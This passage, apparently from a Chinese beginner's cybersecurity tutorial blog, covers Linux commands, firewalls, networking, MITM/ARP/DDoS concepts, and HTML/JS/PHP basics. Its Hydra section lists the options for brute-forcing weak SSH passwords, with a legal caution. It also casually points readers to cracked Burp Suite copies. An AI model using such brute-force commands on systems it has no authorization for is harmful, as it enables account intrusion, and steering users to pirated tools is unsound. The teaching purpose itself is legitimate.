-ano：显示网络状态、查端口、公私网地址、TCP、UDP等。\n软件包管理（deb/rpm、apt/yum） 这里简单知道这个命令就好，基本上配了Kali虚拟机和有下载过CTF的解题工具的经验都见过这些命令：\ndebian\n包格式：.deb\n包管理器：apt\n安装一个包的命令：apt install xx\n这里记得要切换root用户，不然会报错，权限不足\n列出所有可更新的软件清单命令：apt update\n升级软件包：apt upgrade\n在通过Linux进行命令行下载工具时，记得apt update一下噢\n安装指定的软件命令：apt install \u0026lt;package_name\u0026gt;\n删除软件包命令：apt remove \u0026lt;package_name\u0026gt;\n列出所有已安装的包：apt list \u0026ndash;installed\n列出所有已安装的包版本信息：apt list \u0026ndash;all-versions\nredhat\n包格式：.rpm\n包管理器：yum yum install xx\n安装镜像源：vim /etc/apt/sources.list（这个命令比较常用，因为Kali的下载速度比较慢的时候我都会用这个命令去换一下镜像源，阿里云、清华源等，这样速度比较快些）\nLinux系统防火墙 防火墙就是根据系统管理员设定的规则来控制数据包的进出，主要是保护内网的安全。目前Linux系统的防火墙类型主要有两种：分别是iptables和firewalld\niptables-静态防火墙 早期的Linux系统中默认使用的是iptables防火墙，配置文件在/etc/sysconfig/iptables,主要工作在网络层\niptables只可以通过命令行进行配置\niptables默认是允许所有，需要通过拒绝去做限制\niptables在修改了规则之后必须得全部刷新才可以生效，还会丢失连接（无法守护进程）\nfirewalld-动态防火墙 取代了之前的iptables防火墙，配置文件在/usr/lib/firewalld和/etc/fiewalld中,主要工作在网络层\nfirewalld不仅可以通过命令行进行配置，也可以通过图形化界面配置\nfirewalld默认是拒绝所有，需要通过允许去放行\nfirewalld可以动态修改单条规则，动态管理规则集（允许更新规则而不破环现有会话和连接，可以守护进程，会过滤内网、互联网数据，当前电脑系统都有装防火墙的。\n查看firewalld防火墙状态：sudo systemctl status firewalld\n查看iptables防火墙状态（如果系统使用iptables作为防火墙）：sudo systemctl status iptables\n基于RPM的系统安装firewalld：sudo yum install firewalld\n基于Debian的系统（如Ubuntu），虽然通常不预装firewalld，但也可以使用apt命令进行安装：sudo apt install firewalld\n启动firewalld服务：sudo systemctl start firewalld\n关闭firewalld服务：sudo systemctl stop firewalld\n开机自启动：sudo systemctl enable firewalld\n禁止务开机自启动：sudo systemctl disable firewalld\nshell基础与实践 shell脚本\nLinux 的 Shell 种类众多，常见的有：\nBourne Shell（/usr/bin/sh或/bin/sh）\nBourne Again Shell（/bin/bash）\nC Shell（/usr/bin/csh）\nK Shell（/usr/bin/ksh）\nShell for Root（/sbin/sh）\n由于bash易用与免费，其被广泛使用也是大多数Linux系统的默认Shell。(Kali目前为zsh，兼容bash) /bin/bash\n/bin/bash这个shell适用在轻量级程序，易写好操作。\n接下来拿/bin/bash这个shell举个应用例子：\n打开Kali终端，然后输入vim指令：\n在 Kali Linux 中，vim 是一个命令行文本编辑器的启动指令，用于创建、打开和编辑文本文件（如配置文件、脚本、代码等）。当然也是用它来编shell脚本的。\n一开始先点击i键，进入编辑模式，然后再顶行输入#和！，接着输入/bin/bash\n按回车下一行这里我们以简单的echo指令去运行shell，echo类似输出函数print的效果。\n输入好shell后就按Esc键，退出编辑模式，此时输出双引号:，再输入wq+回车保存就好了，然后就自动退出vim模式了，回到命令行界面了，这是这个shell脚本就会保存到相应的路径了，我们可以运行的，\n接下来我们运行一下：\n用ll命令去看看权限：\n这里我之前有提到过：该文件权限为 -rw-rw-r--（所有者和所属组有读写权限，其他用户有读权限）\n可以直接用chmod 777 hacker去给这文件提权。\n这里提一下：每个用户其实都有默认的shell的，向上面所讲的那几种的其中之一，如果我们在vim编辑时不声明是用/bin/bash的话就会用用户本身自带的shell，现在可以用echo $SHELL查看一下：\n可以看到不是/bin/bash而是/usr/bin/zsh，也就是说如果你当时在vim编辑中不写明是#!/bin/bash的话，就会默认用zsh去运行那段代码“echo \u0026ldquo;hello hacke!!!!!!r\u0026rdquo;”\n那我觉得好麻烦啊！！！！！！先vim敲代码然后还要chmod给文件执行提权\u0026hellip;.\n这里有个简单方法：\n这样子的话就是强制执行了，bash、sh这种是默认带x执行权限的，bash就是用/bin/bash去执行里头的代码，那sh就是用另外一种不同的去执行里头的代码\u0026hellip;..\nShell的展示就到这里，感兴趣的可以细学，不过我学完C、Python感觉学不下shell了哈哈😄\u0026hellip;..\nXshell\nXshell 是一款功能强大的终端模拟器，它支持SSH、SERIAL等多种协议，可以用于远程连接和管理服务器或虚拟机。在我们以后工作可以用Xshell去连接公司的服务器。（ Xftp 快速传输工具）\n当然习惯用winscp、todesk、电脑自带的RDP这些的话也行。\n连接时记得打开SSH，网络要能ping通\u0026hellip;.\nXshell、Xftp怎么用我不介绍了，搜一搜有教程。\n九头蛇-ssh弱口令爆破实战\n介绍：Hydra是一款强大的网络登录破解工具，可以用于测试SSH等服务的弱口令。Hydra是一个开源的密码破解工具，主要用于网络安全的渗透测试。kali白带无需安装。\n使用语法\u0026mdash;- hydra 参数IP地址 服务名\n常见命令：\nhydra [-l 用户名或者-L 用户名文件路径]\n[-p密码 或者-Р密码文件路径]\n[-t线程数]默认16\n[-vV 显示详细信息]\n[-o 输出文件路径\n[-f找到密码就停止]\n[-e ns 空密码和指定密码试探]\n[ip |-M ip列表文件路径]\n这里给大家这些命令，关于详细用法在后续，下一阶段将和burpsuite细讲\u0026hellip;\u0026hellip;\n法律问题：未经授权对系统进行密码破解是违法行为，仅可在自己拥有或获得明确许可的系统上使用。\n网络安全基础 计算机网络保姆级资料\n计算机网络 计算机网络基础 计算机网络是一组自治计算机互连的集合；\n一个完整的计算机网络系统主要由硬件、软件和协议三大部分组成，缺一不可。\n计算机网络网络的基本功能\n• 资源共享；\n• 分布式处理与负载均衡；\n• 综合信息服务；\n协议：实现通信所需要的一些约定，为使网内各计算机之间的通信可靠有效,通信双方必须共同遵守的规则和约定称为通信协议。\n伴随着计算机网络的飞跃发展，各大厂商根据自己的协议生产出了不同的硬件和软件。为了实现网络设备间的互相通讯，ISO和IEEE相继提出了OSI参考模型及其TCP/IP模型。\n层次模型：计算机网络是一个非常复杂的系统，分层可以将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。\nOSI与TCP、IP网络模型 OSI参考模型定义了网络中设备所遵守的层次结构\n分层结构的优点：开放的标准化接口；多厂商兼容；易于理解、学习和更新协议标准；实现模块化工程，降低了开发实现的复杂度；便于故障排除。\nTCP/UDP\u0026ndash;传输层 TCP工作机制：三次握手建立连接，四次挥手断开连接。\nTCP(Transmission Control Protocol 传输控制协议)是一种面向连接的、可靠的。\nUDP协议：\n用户数据报协议，无连接的、不可靠的、基于数据报的传输层通信协议。\n用于数据传输控制的协议，对数据的可靠性、安全没有保证，不需要连接就可以发送。\n总结：\ntcp是面向连接的，udp是面向无连接\ntcp的报文的结构相对要比udp更复杂\ntcp是基于字节流（0、1），udp是基于数据报\ntcp会保证数据的正确性、udp不能，会存在丢包的现象\n交换机与路由器 交换机：\n交换机按照通信两端传输信息的需要，用人工或设备自动完成的方法，把要传输的信息送到符合要求的相应路由上的技术统称。它能够为接入交换机的任意两个网络节点提供独享的电信号通路。\n交换机的工作方式:\n数据包转发\n交换机接收到数据包后，会依据数据包中的目的 MAC 地址来决定将数据包转发到哪个端口。具体过程是，交换机查询自身的 MAC 地址表 ，如果目的 MAC 地址在表中有对应的端口记录，就将数据包转发到该端口；若 MAC 地址表中没有匹配的记录，交换机则会采用泛洪的方式，将数据包转发到除接收端口外的其他所有端口 。例如，在一个办公室网络中，当某台计算机 A 向计算机 B 发送数据时，交换机先查找 MAC 地址表，若找到计算机 B 对应的端口，就把数据包精准发到该端口；若没找到，就会把数据包发到其他所有连接设备的端口，直到计算机 B 接收到并做出回应，交换机也就学习到了计算机 B 的 MAC 地址和对应端口。\nMAC 地址学习\n交换机刚启动时，MAC 地址表是空的。在工作过程中，它会学习连接到各个端口设备的 MAC 地址。当交换机从某个端口接收到一个数据包时，它会记录下数据包源 MAC 地址与该接收端口的对应关系，并将其添加到 MAC 地址表中 。随着时间推移，交换机通过不断接收来自不同设备的数据包，逐渐建立起完整的 MAC 地址表。比如，新接入网络的打印机发送了一个数据包，交换机就会记录下打印机的 MAC 地址和它所连接的端口，下次再有发往该打印机的数据，就能直接转发。\n高速数据传输\n交换机内部采用了并行处理技术，能够同时处理多个端口之间的数据传输，具备很高的数据传输速率。交换机为每个端口提供独立的带宽，端口之间的数据传输可以并行进行，不会产生冲突，这大大提高了网络的整体性能 。比如在一个有 24 个端口的百兆以太网交换机中，每个端口都可以提供 100Mbps 的带宽，不同端口之间的数据传输可以同时进行，极大地提升了数据传输效率，满足了网络中大量设备同时高速传输数据的需求。\n路由器：\n路由器是一种用于连接多个逻辑上分开的网络的\n设备，它能够在多网络互联环境中建立灵活的连接，\n实现不同网络之间的数据传输\n路由决策\n路由决策是路由器 “判断走哪条路转发数据” 的过程，核心是依据路由表选择最优路径，避免数据绕远路或走拥堵的路。\n数据包转发\n路由器的核心作用是将数据包从一个网络转发到另一个网络（比如把家里的局域网数据转发到互联网，或把 A 公司的网络数据转发到 B 公司的网络），关键依赖 “IP 地址” 而非交换机的 “MAC 地址”。\n网络安全\n路由器自带基础的安全功能，能阻挡非法访问、保护内部网络，常见手段包括：\n防火墙功能： 可配置 “访问控制规则”，比如禁止外部网络直接访问内部的服务器（只允许内部主动访问外部），或限制特定 IP / 端口的访问（比如禁止家里的设备访问危险端口 22、3389）。\nNAT 地址转换： 把内部的 “私有 IP”（如 192.168.1.x、10.0.0.x）转换成 “公网 IP”，外部网络只能看到公网 IP，无法直接访问内部的私有 IP 设备，相当于给内部网络加了一层 “隐藏保护”。\nDHCP 地址过滤： 只给指定 MAC 地址的设备分配 IP（比如只允许家里的手机、电脑连网，陌生设备即使连了 WiFi 也拿不到 IP，无法访问网络）。\nVPN 功能： 企业中常用，员工在外网（比如咖啡厅 WiFi）可通过 “VPN 连接” 加密访问公司内部网络，防止数据被窃取。\n网络分类\n按照覆盖范围分类\n○局域网（LAN）：局限于较小的地理范围内，如家庭、学校或公司内部的网络。\n○城域网（MAN）：覆盖范围比局域网大，通常覆盖一个城市或地区。\n○广域网（WAN）：覆盖范围广泛，可以跨越多个城市、国家或地区，甚至全球。\nIP地址\u0026ndash;网络层\nIP地址是电子设备（计算机）在互联网上的唯一标识。IP地址分为IPv4和IPv6。IPv4地址由32位二进制组成，采用点分十进制。\nIP主要作用\n标识节点和链路：用唯一的IP地址标识每一个节点;用唯一的IP网络号标识每一个链路。\n寻址和转发：确定节点所在网络的位置，进而确定节点所在的位置;IP路由器选择适当的路径将IP包转发到目的节点。\nIP地址格式表示方法\nIP地址由网络号（包括子网号）和主机号两部分组成。网络位相同的IP地址为同一网段。\n网络号用于区分不同的IP网络。\n主机号用于标识该网络内的一个IP节点。\nIP地址分类\nIPv4地址分为A、B、C、D、E 五类，每一类有不同的划分规则：\n一、A 类地址：面向大型网络的 “骨干级” 地址\n核心特征： 最高位固定为 “0”，地址结构是「1 字节网络位 + 3 字节主机位」（比如10.0.0.0，前 8 位是网络位，后 24 位是主机位）。 关键补充： 地址范围中，1.0.0.0 ~ 126.255.255.255 是合法可用地址，127.0.0.0/8 网段（不止127.0.0.1）均为 “回环地址”，用于本地测试（比如ping 127.0.0.2也能检测本机网络协议栈是否正常）。 每个网络可容纳 2²⁴ - 2 = 16777214 个主机（减 2 是因为 “网络地址” 如10.0.0.0和 “广播地址” 如10.255.255.255不能分配给主机）。 典型场景：早期用于大型企业、运营商骨干网络（比如某省的电信核心网络可能用一个 A 类地址段）。 二、B 类地址：适配中型网络的 “区域级” 地址\n核心特征： 最高两位固定为 “10”，地址结构是「2 字节网络位 + 2 字节主机位」（比如172.16.0.0，前 16 位是网络位，后 16 位是主机位）。 关键补充： 可容纳 2¹⁶ - 2 = 65534 个主机，适合中型园区、高校或集团公司（比如一所大学的校园网可能用一个 B 类地址段，覆盖所有教学楼、宿舍的设备）。 私有 B 类地址段：172.16.0.0 ~ 172.31.255.255（共 16 个网段），常用于企业内部局域网，不对外网路由。 典型场景：中型企业、高校校园网、城市级政务内网。 三、C 类地址：服务小型网络的 “终端级” 地址\n核心特征： 最高三位固定为 “110”，地址结构是「3 字节网络位 + 1 字节主机位」（比如192.168.1.0，前 24 位是网络位，后 8 位是主机位）。 关键补充： 每个网络仅能容纳 2⁸ - 2 = 254 个主机，适合小型办公室、家庭局域网（比如家里的路由器默认用192.168.1.0/24，最多连 254 台设备）。 私有 C 类地址段：192.168.0.0 ~ 192.168.255.255（共 256 个网段），是最常用的内网地址（路由器、摄像头、智能家居设备基本都用这类地址）。 典型场景：家庭 WiFi、小型公司、商铺的局域网。 四、D 类地址：专注 “一对多” 的组播地址\n核心特征： 最高四位固定为 “1110”，地址范围是224.0.0.0 ~ 239.255.255.255，没有网络位和主机位之分，直接代表一个 “组播组”。 关键补充： 不是给单个设备分配，而是给一组设备 “共同订阅”（比如设备加入224.0.0.1组播组，就能接收发给这个组的所有数据）。 常见用途：视频会议（多人同时接收同一视频流，避免重复发送浪费带宽）、安防监控（多个监控屏幕接收同一摄像头的画面）、IPTV（机顶盒接收电视台的组播信号）。 特殊地址：224.0.0.1是 “所有主机组播地址”（同一网段内所有设备都能接收），224.0.0.5是 OSPF 路由协议专用组播地址。 五、E 类地址：预留的 “科研级” 地址\n核心特征： 最高四位固定为 “1111”，地址范围是240.0.0.0 ~ 255.255.255.255，目前没有公开商用，仅用于科研实验、协议测试（比如未来可能的 IPv4 扩展技术研发）。 注意：255.255.255.255是 “全局广播地址”，不属于 E 类的常规用途，发送到这个地址的数据会被同一网段所有设备接收（比如路由器的 DHCP 广播）。 内网与外网 公网地址是由互联网注册机构进行分配的，这些地址在Internet上是唯一的，并且具有全球可达性。公网地址用于Internet上的设备，允许设备在Internet上进行通信。 私网地址则是由局域网管理员自行分配的，它们只在局域网内部具有唯一性。私网地址则仅限于局域网内部使用，不能直接在Internet上访问。这种设计有助于保护内部网络的安全性，防止内部网络与公共网络之间的冲突。 子网掩码：用来确定IP地址的网络位，网络号的位都置1，主机号都置0。\n内网（局域网，LAN）\n定义：内网是指在某一特定区域内由多台计算机以及网络设备构成的网络，如校园网、政府网、企业内网等。\n范围：内网的覆盖范围相对较小，通常仅限于某一建筑物、园区或公司内部，方圆几公里以内。\n外网（广域网，WAN）\n定义：外网又称广域网、公网，是连接不同地区局域网或城域网计算机通信的远程网。\n范围：外网的覆盖范围广泛，可以跨越城市、国家甚至全球，提供远距离通信服务。\n虚拟专用网络（（Virtual Private Network，VPN））\n定义：是指依靠ISP或其他NSP在公用网络基础设施之上构建的专用的安全数据通信网络，只不过这个专线网络是逻辑上的而不是物理的，所以称为虚拟专用网。\n虚拟：用户不再需要拥有实际的长途数据线路，而是使用公共网络资源建立自己的私有网络。\n专用：虚拟出来的网络并非任何连接在公共网络上的用户都能使用，只有经过授权的用户才可以使用。\n常见名词 DNS-域名：由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称\n常见的域名有www.baidu.com , www.taobao.com , www.jd.com 这些都是域名。\n域名可以在Godaddy、Gandi、Hover、Namesilo、Namecheap等网站注册。\n域名由两个或两个以上的词构成，中间由点号分隔开。最右边的那个词称为顶级域名。\nCDN（Content DeliveryNetwork）\n即内容分发网络，CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。\n代理\n代理也称网络代理，是一种特殊的网络服务。它允许客户端通过这个服务与服务器进行连接。简单的来说，可以把代理理解为一种网络中间商。\n网络协议安全 HTTP协议(Hyper Text Transfer Protocol)\n它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的超文本传输协议。\n建立连接：客户端与服务器之间建立连接。\n发送请求：客户端向服务器发送请求，请求中包含要访问的资源。\n处理请求：服务器接收到请求后，根据请求中的信息找到相应的资源，执行相应的处理操作。\n发送响应：服务器将处理后的结果封装在响应中，并将其发送回客户端。\n关闭连接：在完成请求-响应周期后，客户端和服务器之间的连接可以被关闭。\nHTTPS 协议HyperText Transfer Protocol Secure\n是（超文本传输安全协议）的缩写，是一种通过计算机网络进行安全通信的传输协议。\nHTTPS 的主要作用是在不安全的网络上创建一个安全信道，并可在使用适当的加密包和服务器证书可被验证且可被信任时，对窃听和中间人攻击提供合理的防护。\n关于SSL证书，这个地方可以用我的博客去进做例子：\nExpl0rer.Ct1号\nExpl0rer.Ct2号\n你可以看看1号和2号的区别😄（温馨提醒：打开网站后看左上角）\nhttp、https\nGET：请求从服务器获取指定资源。这是最常用的方法，用于访问页面。\nPOST：请求服务器接受并处理请求体中的数据，通常用于表单提交。\nPUT：请求服务器存储一个资源，并用请求体中的内容替换目标资源的所有内容。\nDELETE：请求服务器删除指定的资源。\nHEAD：与 GET 类似，但不获取资源的内容，只获取响应头信息\nHTTP **响应头信息：**https://expl0rer.top/\nwireshark与Tcpdump Wireshark是一款开源抓包工具，也被称为网络嗅探器，用于分析网络流量和数据包。适用于Windows环境，也支持其他操作系统。当然它也是CTF流量分析中的常用工具。\nTcpdump是一个命令行格式的网络抓包工具，用于捕获和分析网络数据包。适用于Linux环境，是类UNIX系统下用于网络分析和问题排查的首选工具。\nBurpsuite工具 BurpSuite是一款集成化的渗透测试工具，它包含了许多功能，可以帮助安全人员快速完成对web应用程序的渗透测试和攻击。\n网上有众多的破解版，可以自己去“0元购”\u0026hellip;\u0026hellip;\nMITM中间人攻击 MITM（Man-in-the-Middle）中间人攻击是一种网络攻击方式，攻击者通过某种手段将自己插入到通信双方之间，窃取、篡改或者干扰双方的通信内容\nMITM攻击的基本原理是攻击者通过各种技术手段（如ARP欺骗、DNS劫持、Wi-Fi劫持、IP欺骗、SSL/TLS欺骗等），将一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。在这个过程中，攻击者可以截取、查看、篡改、伪造或修改受害者之间的通信数据，以达到窃取敏感信息、篡改数据或实施其他恶意行为的目的。\nARP欺诈攻击 ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\n僵尸网络与DDos攻击 僵尸网络\n僵尸网络是由黑客集中控制的一群互联网上的计算机。黑客通过各种手段将大量的主机感染僵尸程序，从而在控制者和被感染主机之间形成一对多的控制僵尸网络。\n僵尸网络是一个可控制的网络，由黑客进行控制。这个网络是采用了一定的恶意传播手段形成的；可以一对多的执行相同的恶意命令，因为数量庞大，一个人无法单独。\nDDos攻击 DDoS攻击(分布式拒绝服务攻击)是一种常见的网络攻击方式，旨在使目标服务器无法正常提供服务，在DDoS攻击中，攻击者会控制大量的计算机或设备，向目标服务器发送大量的请求，使其超出承受范围，导致服务器无法正常响应请求，从而使服务不可用。\n一种常见的DDoS攻击方式是DNS Request Flood攻击。这种攻击既可以针对DNS缓存服务器，又可以针对DNS授权服务器。攻击者通过直接或间接向DNS服务器发送大量不存在的域名解析请求，导致服务器严重超载，无法继续响应正常用户的DNS请求。这种攻击会导致DNS服务器瘫痪，影响正常业务的进行。\nWeb安全基础 Web基础 Web（万维网）的组成构建主要包括以下几个核心部分：客户端（前端）、服务器（后端）、数据库\nWeb服务器：\n也称为网站服务器，是指驻留于因特网上某种类型计算机的程序。它可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；还可以放置数据文件，供全世界下载。\nWeb开发框架是一种开发框架，用于支持动态网站、网络应用和网络服务的开发。它提供了一套标准化的方法，使得开发人员可以更加高效地进行Web应用程序的开发。\n作用：Web开发框架是一种提供开发者工具和功能的软件框架，用于简化和加速Web应用程序的开发过程、提高开发效率、简化开发流程、增强安全性、提高丰富的功能和工具、促进团队协作及代码复用。\n前端框架：Angular、react、vue.js\n简介：由Google开发并维护的一个全面的前端开发平台，主要用于构建动态Web应用程序\n后端框架：\nYii、python、php、java\n简介：基于PHP的高性能Web开发框架。\nWeb结构 Web访问流程 Web前端 本章前端对于网安人来说学习要求不高，能基本读懂代码知道代码大概意思以及前端语言的结构样式就好。\nHTML：网页的“结构骨架” HTML全称（hyper text markup language）译为超文本标记语言。\n在Visual Studio Code中，HTML结构式有快捷方式输出：\nHTML基本语法 HTML语言结构相对其它变成语言比较简单些，只要理解大体结构就好。\n标签语法\n\u0026lt;标签名 属性名= “属性值” 属性名= “属性值” \u0026gt; \u0026lt;/标签名\u0026gt;\n\u0026lt;标签名 属性名= “属性值” /\u0026gt;\n属性语法\n属性名= “属性值”\nHTML很简单 合起来\n\u0026lt;标签名 属性名= “属性值”\u0026gt;\u0026lt;/标签名\u0026gt;\n\u0026lt;标签名 属性名= “属性值” /\u0026gt;\nHTML基本标签 标题标签\n\u0026lt;h1\u0026gt;标题\u0026lt;/h1\u0026gt; 到\u0026lt;h6\u0026gt;标题\u0026lt;/h6\u0026gt;\n段落标签\np：paragraphs\n\u0026lt;p\u0026gt;第一个段落\u0026lt;/p\u0026gt;\n超链接\n\u0026lt;a href=\u0026quot;\u0026quot; target=\u0026quot;\u0026quot; \u0026gt;\u0026lt;/a\u0026gt;\n图片\n\u0026lt;img src=\u0026quot;\u0026quot;/\u0026gt;\n换行\n\u0026lt;br /\u0026gt;\n表单标签\n​\t\u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/form\u0026gt;\n​\t表单元素标签\n​\t\u0026lt;input type=\u0026quot;\u0026quot; name=\u0026quot;\u0026quot; /\u0026gt;\n​\t单行文本框\n​\t\u0026lt;input type=\u0026ldquo;text\u0026rdquo; name=\u0026quot;\u0026quot; /\u0026gt;\n​\t密码框\n​\t\u0026lt;input type=\u0026ldquo;password\u0026rdquo; name=\u0026quot;\u0026quot; /\u0026gt;\n​\t提交按钮\n​\t\u0026lt;input type=\u0026ldquo;submit\u0026rdquo; name=\u0026quot;\u0026quot; /\u0026gt;\nCSS：网页的 “样式装修” CSS 指的是层叠样式表(Cascading Style Sheets)，使用CSS样式可以对页面字体、颜色、背景和其他效果实现精确描述。\nCSS基础选择器：\n元素选择器\n标签名{}\nid 选择器\n#id属性值{}\nclass 选择器\n.class属性值{}\n常用样式：\n尺寸样式：宽 width: 100px; 高 height: 100px;\n背景样式：background: red;\n文本样式：color: red;\n字体样式：font-size: 100px;\nhttps://expl0rer.top/\nJavascript/JS：网页的 “交互功能” JavaScript是一种轻量级、解释型的高级编程语言，它是网页开发中不可或缺的一部分，主要用于客户端脚本处理。\nJavaScript可以给网页添加动态效果JavaScript由核心（ECMAScript）、文档对象模型（DOM）、浏览器对象模型（BOM）这三部分组成。\nJS注释（其实和大类编程语言的注释所用的符号差不多的）：\n单行//\n多行/* \u0026hellip;\u0026hellip;*/\n输出语句：\n1、alert()警告框\n2、document.write()文档写\n变量\n1、声明 var\n2、赋值=\n3、使用\n这里举个函数例子：function\n将某一个常用的功能进行封装。当你想使用这个功能的时候，可以选择调用、执行这个功能即可。关键字function定义函数函数使用分为两部分：声明、调用\n定义函数\nfunction 函数名(){\n//函数体\u0026hellip;\u0026hellip;\n}\n调用函数\n函数名();\n事件\nJavaScript 中的事件（Event）是指发生在文档或浏览器窗口中，能够被 JavaScript 侦测到的交互行为或其他动作。事件可以是用户的操作（如点击按钮、按键、移动鼠标等），也可以是系统行为（如页面加载、滚动、错误发生等）。\n\u003c!DOCTYPE html\u003e 按钮 1 2 3 4 5 6 7 8 9 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button value=\u0026#34;button\u0026#34; onclick=\u0026#34;alert(\u0026#39;hello hacker\u0026#39;)\u0026#34;\u0026gt;按钮\u0026lt;/button\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; JS对象概念\nJS说一种基于对象的编程语言\nJS对象-DOM\n当网页被加载时，浏览器会创建页面的文档对象模型HTML DOM 模型被构造为对象的树：\nJS 来操作HTML文档时，一定要先获取元素\n简单理解：JS 可以操作所有的HTML标签\nJS获取文档对象：\ngetElementById()：通过ID获取元素\n例如：document.getElementById(‘p1’);\nWeb前端三件套 Web 前端三件套指的是 HTML、CSS、JavaScript 这三种核心技术，它们共同构成了浏览器中 “可交互、可视化网页” 的基础，三者分工明确又协同工作，就像 “建筑骨架、装修风格、功能控制系统” 的关系，缺一不可。\n可以把网页比作 “一家咖啡店”：\nHTML：咖啡店的 “空间结构”（哪里是吧台、哪里是座位、哪里是门口），定义 “有什么区域和功能模块”； CSS：咖啡店的 “装修风格”（墙面颜色、灯光亮度、桌椅样式、招牌设计），决定 “看起来好不好看”； JavaScript：咖啡店的 “服务功能”（店员响应点单、自动门感应开门、电视播放视频），实现 “用户能做什么交互”。 三者共同组成了我的博客\u0026hellip;\u0026hellip;\n没有 HTML，CSS 和 JS 就没有 “作用对象”；没有 CSS，HTML 只是无样式的骨架；没有 JS，网页只是 “静态图片”，无法响应用户操作。\nWeb后端 客户端与服务端交互流程：\n中间件介绍：\nApache是Web服务器软件，它可以运⾏在⼏乎所有的计算机平台上，是最流⾏的Web服务器端软件之⼀:\nApache的官⽅⽹站\nPHP基础 PHP的介绍 PHP(HyperText Preprocessor)全名为超文本预处理器，是一种专用在服务端的语言，为web涉及，可以嵌入到HTML语言，也就是后端的主要语言，php代码将在web服务端中被解释为HTML代码，返回客户端，详细可见PHP官方网站\n对于环境搭建的话，想和Python、C、Java集成到一起可以用visual studio code；也可用phpstorm（强烈建议！环境搭建简单）\nPhpstudy 自己去下载phpstudy，支持Windows和Linux的，教程不在这展示。\n语法 PHP标记 \u0026lt;?php … ?\u0026gt;\n指令分隔符 ; 注释 //单行注释 /多行注释/\nPHP 变量规则：\n- 变量以 $ 符号开始，后面跟着变量的名称(可以理解为C语言的int、long int的定义作用\u0026hellip;)\n- 变量名必须以字母或者下划线字符开始\n- 变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n- 变量名不能包含空格\n- 变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n注意：当赋一个文本值给变量时，需要在文本值两侧加上引号。\nPHP 语句和 PHP 变量都是区分大小写的。\nPHP页面输出： echo——输出单一类型(数值，字符串，布尔)，多个用逗号隔开。\nprint_r()——输出复合类型（数组，对象），一般用于输出数组。\nvar_dump()——打印数据详细信息(所有类型)。\n字符串类型 字符串定义方式：单引号、双引号\n• 单引号字符串中出现的变量不会被变量的值替代。\n• 双引号字符串中最重要的一点是其中的变量会被变量值替代。\n• 如果遇到美元符号($),解析器会尽可能多地取得后面的字符以组成一个合法的变量名,如果想明确的指定名字的结束，用花括号把变量名括起来。\n符号 还有些转义字符：\n\\n 换行\n\\r 回车 ( WINDOW \\r\\n ) (linux \\n) （Mac OS \\r）\n\\t 水平制表符 (按键盘 tab 产生的效果)\n\\ 反斜线\n$ 美元符(表示变量的开始)\n\u0026quot; 双引号\nPHP运算符：\n算术运算符：+ - * / % 取余数 9%3=0\n赋值运算符：=\n字符串运算符：. (点 - 字符串拼接符)\n递增 递减：++ \u0026ndash;\n逻辑运算符：\u0026amp;\u0026amp; || ！\n比较运算符：\u0026gt; \u0026lt; \u0026gt;= \u0026lt;= == === != !== \u0026lt;\u0026gt;\n三元运算符：? :\nPHP流程控制 PHP流程控制语句用于决定代码的执行顺序循环则是重复执行某段代码直到满足特定条件为止\nif、else 语句 - 在条件成立时执行代码\nswitch有选择地执行若干代码之一：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php ... switch(n) { case label1: ... break; case label2: ... break; default: ... } ?\u0026gt; while只要指定的条件成立，则循环执行代码块：\n1 2 3 4 5 6 7 8 \u0026lt;?php .... while (条件) { ... } ... ?\u0026gt; do\u0026hellip;while首先执行一次代码块，然后在指定的条件成立时重复这个循环:\n开始 do\u0026hellip;while 循环。循环将变量 i 的值递增 1，然后输出。先检查条件（i 小于或者等于 5），只要 i小于或者等于 5，循环将继续运行。\n1 2 3 4 5 6 7 8 \u0026lt;?php $i=1; do{ echo \u0026#34;The number is \u0026#34; . $i . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $i++; }while ($i\u0026lt;=5); ?\u0026gt; for循环：\n1 2 3 4 5 6 \u0026lt;?php for (初始值；条件；增量) { ...; } ?\u0026gt; PHP函数 PHP函数将实现某一功能的代码块封装到一个结构中，实现代码复用，只要系统在内存中能够找到对应的函数，就可以执行（函数的调用可以在函数定义之前）\n函数的定义：\n1 2 3 4 5 6 \u0026lt;?php function functionName() { // 要执⾏的代码 } ?\u0026gt; 函数的调用：\n1 2 3 4 5 6 7 8 \u0026lt;?php function writeName() { echo \u0026#34;Kai Jim Refsnes\u0026#34;; } echo \u0026#34;My name is \u0026#34;; writeName();//调⽤函数 ?\u0026gt; 函数名(参数);\nPHP 函数准则：\n函数的名称应该提示出它的功能;\n函数名称以字母或下划线开头（不能以数字开头）。\n示例，下面的函数有两个参数：\n1 2 3 4 5 6 7 function name($s) //形参 { echo $s,\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo \u0026#34;我的名字是\u0026#34;; name(\u0026#34;张三\u0026#34;); //实际参数 PHP函数——返回值 如需让函数返回⼀个值，请使⽤ return 语句：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php function add($x,$y) { $total=$x+$y; return $total; } echo \u0026#34;1 + 16 = \u0026#34; . add(1,16);//return调⽤要使⽤echo，不然不会返回值 ?\u0026gt; PHP内置函数 PHP 有很多标准的函数和结构。PHP系统提供了大量功能强大的函数，帮助我们解决各种问题;\nisset(); 判断变量是否被设置\nempty(); 